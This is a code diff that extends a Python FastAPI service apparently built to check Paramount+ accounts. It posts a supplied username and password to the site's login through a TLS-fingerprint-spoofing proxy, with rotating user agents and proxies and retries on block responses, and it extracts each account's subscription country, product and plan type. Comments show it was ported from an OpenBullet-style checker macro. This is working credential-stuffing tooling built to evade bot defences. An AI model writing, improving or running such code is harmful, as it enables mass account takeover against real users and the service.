@@ -1,6 +1,8 @@
 import re
 import secrets
 import json
+import time
+import logging
 from typing import Optional
 
 import httpx
@@ -8,7 +10,13 @@ from fastapi import FastAPI, HTTPException
 from pydantic import BaseModel
 
 # ------------------------------------------------------------------------------
-# Pydantic request/response models
+# Logging
+# ------------------------------------------------------------------------------
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# ------------------------------------------------------------------------------
+# Pydantic models
 # ------------------------------------------------------------------------------
 class CheckRequest(BaseModel):
     username: str
@@ -49,7 +57,7 @@ H2_ORDER = "auto"
 H2_SETTINGS = '{"mode": "auto"}'
 
 # ------------------------------------------------------------------------------
-# User‑Agent & country map (same as before)
+# User‑Agent list & Country map (same as before, but compact)
 # ------------------------------------------------------------------------------
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
@@ -327,11 +335,16 @@ def parse_proxy(proxy_str: str):
     proxy_url = f"http://{userpass}@{ipport}"
     return proxy_url, userpass, ipport
 
-def get_common_headers(user_agent: str) -> dict:
-    """Base headers sent to TLSProxy (mirrors the original script)."""
-    return {
+def build_tls_proxy_headers(
+    target_url: str,
+    target_method: str,
+    user_agent: str,
+    proxy_override: Optional[str] = None
+) -> dict:
+    """Build the full headers for the TLSProxy request, mirroring the macro exactly."""
+    headers = {
         "Host": "www.intl.paramountplus.com",
-        "Cookie": "CBS_DEVICEID=",              # exactly as in script
+        "Cookie": "CBS_DEVICEID=",
         "Cache-Control": "max-age=0",
         "Traceparent": "00-c206720e0f5a4e1387706d69d577877c-10cc66f212114532-01",
         "Tracestate": "2321606@nr=0-2-2936348-766585785-10cc66f212114532----1763113514852",
@@ -347,17 +360,9 @@ def get_common_headers(user_agent: str) -> dict:
         "Sec-Ch-Ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
         "Sec-Ch-Ua-Mobile": "?0",
         "Sec-Ch-Ua-Platform": '"Windows"',
+        "Content-Type": "application/x-www-form-urlencoded",   # <-- added this!
     }
-
-def build_tls_proxy_headers(
-    target_url: str,
-    target_method: str,
-    user_agent: str,
-    proxy_override: Optional[str] = None
-) -> dict:
-    """Build the full headers for the TLSProxy request."""
-    headers = get_common_headers(user_agent)
-    # TLSProxy specific headers
+    # TLSProxy specific
     headers["x-tp-h1order"] = H1_ORDER
     headers["x-tp-h2order"] = H2_ORDER
     headers["x-tp-url"] = target_url
@@ -366,11 +371,31 @@ def build_tls_proxy_headers(
     headers["x-tp-chid"] = CHID
     if proxy_override:
         headers["x-tp-proxy"] = proxy_override
+    # else we do NOT add the header at all (macro leaves it as "<proxy>" but that's a placeholder)
     return headers
 
 
 # ------------------------------------------------------------------------------
-# Core check function (now using TLSProxy)
+# Wait for TLSProxy to be ready (called on startup)
+# ------------------------------------------------------------------------------
+@app.on_event("startup")
+async def startup_event():
+    logger.info("Checking if TLSProxy is running on %s...", TLS_PROXY_URL)
+    for attempt in range(10):
+        try:
+            async with httpx.AsyncClient(timeout=2.0) as client:
+                # Try to connect; any response is fine, we just need the port open.
+                await client.get(TLS_PROXY_URL)
+            logger.info("✅ TLSProxy is ready (attempt %d)", attempt+1)
+            return
+        except Exception:
+            logger.info("⏳ Waiting for TLSProxy... (attempt %d/10)", attempt+1)
+            await asyncio.sleep(1)
+    logger.warning("⚠️  TLSProxy did not respond within 10 seconds. Continuing anyway, but requests may fail.")
+
+
+# ------------------------------------------------------------------------------
+# Core check function
 # ------------------------------------------------------------------------------
 async def perform_check(request: CheckRequest) -> CheckResponse:
     device_id = generate_device_id()
@@ -384,7 +409,6 @@ async def perform_check(request: CheckRequest) -> CheckResponse:
         except ValueError as e:
             return CheckResponse(success=False, message=f"Proxy parsing error: {e}")
 
-    # We use a single client for both requests (connection reuse is fine)
     async with httpx.AsyncClient(timeout=120.0, http2=True) as client:
         # ---------- First request: login (POST) ----------
         login_url = (
@@ -395,21 +419,26 @@ async def perform_check(request: CheckRequest) -> CheckResponse:
         login_body = f"j_username={request.username}&j_password={request.password}&deviceId={device_id}"
 
         max_retries = 3
+        resp = None
         for attempt in range(max_retries):
             try:
-                # TLSProxy expects the outer method to match x-tp-method, so we POST
                 resp = await client.post(TLS_PROXY_URL, content=login_body, headers=login_headers)
             except httpx.HTTPError as e:
+                logger.warning("Login attempt %d failed: %s", attempt+1, e)
                 if attempt == max_retries - 1:
                     return CheckResponse(success=False, message=f"Login request failed: {e}")
                 continue
 
             status = resp.status_code
             if status in (500, 403, 406):
+                logger.info("Login got status %d, retrying (%d/%d)", status, attempt+1, max_retries)
                 if attempt == max_retries - 1:
                     return CheckResponse(success=False, message=f"Login retry exhausted, last status {status}")
                 continue
             break
+
+        if resp is None:
+            return CheckResponse(success=False, message="No response from login")
 
         text = resp.text
         if "Invalid username/password pair" in text or '"status":400,"error":"Bad Request"' in text:
@@ -424,25 +453,33 @@ async def perform_check(request: CheckRequest) -> CheckResponse:
         )
         status_headers = build_tls_proxy_headers(status_url, "GET", user_agent, tp_proxy_override)
 
+        resp_status = None
         for attempt in range(max_retries):
             try:
-                # Outer method is GET (as x-tp-method is GET)
                 resp_status = await client.get(TLS_PROXY_URL, headers=status_headers)
             except httpx.HTTPError as e:
+                logger.warning("Status attempt %d failed: %s", attempt+1, e)
                 if attempt == max_retries - 1:
                     return CheckResponse(success=False, message=f"Status request failed: {e}")
                 continue
 
             status = resp_status.status_code
             if status in (500, 403, 406):
+                logger.info("Status got status %d, retrying (%d/%d)", status, attempt+1, max_retries)
                 if attempt == max_retries - 1:
                     return CheckResponse(success=False, message=f"Status retry exhausted, last status {status}")
                 continue
             break
 
+        if resp_status is None:
+            return CheckResponse(success=False, message="No response from status")
+
         status_text = resp_status.text
-        # The original script has a custom keycheck with banIfNoMatch=False,
-        # so we don't fail even if "NEW_FREE_PACKAGE" or '"planType":null,' are missing.
+
+        # Even if the custom keycheck doesn't match, we proceed (banIfNoMatch=False)
+        # but we can log it if needed.
+        if "NEW_FREE_PACKAGE" not in status_text and '"planType":null,' not in status_text:
+            logger.info("Status response did not contain NEW_FREE_PACKAGE or planType:null, but continuing.")
 
         # Parse JSON
         try:
@@ -450,6 +487,7 @@ async def perform_check(request: CheckRequest) -> CheckResponse:
         except json.JSONDecodeError:
             return CheckResponse(success=False, message="Status response is not valid JSON")
 
+        # Extract fields
         subscription_country = data.get("subscriptionCountry", "") or ""
         product_name = data.get("productName", "") or ""
         plan_type = data.get("planType", "") or ""
@@ -474,7 +512,7 @@ async def perform_check(request: CheckRequest) -> CheckResponse:
 
 
 # ------------------------------------------------------------------------------
-# FastAPI endpoint
+# FastAPI endpoints
 # ------------------------------------------------------------------------------
 @app.post("/check", response_model=CheckResponse)
 async def check_account(req: CheckRequest):
@@ -482,9 +520,18 @@ async def check_account(req: CheckRequest):
         result = await perform_check(req)
         return result
     except Exception as e:
+        logger.exception("Unhandled exception")
         raise HTTPException(status_code=500, detail=str(e))
 
 
 @app.get("/health")
 async def health():
     return {"status": "ok"}
+
+
+# ------------------------------------------------------------------------------
+# If you want to run directly (optional)
+# ------------------------------------------------------------------------------
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run(app, host="0.0.0.0", port=8000)
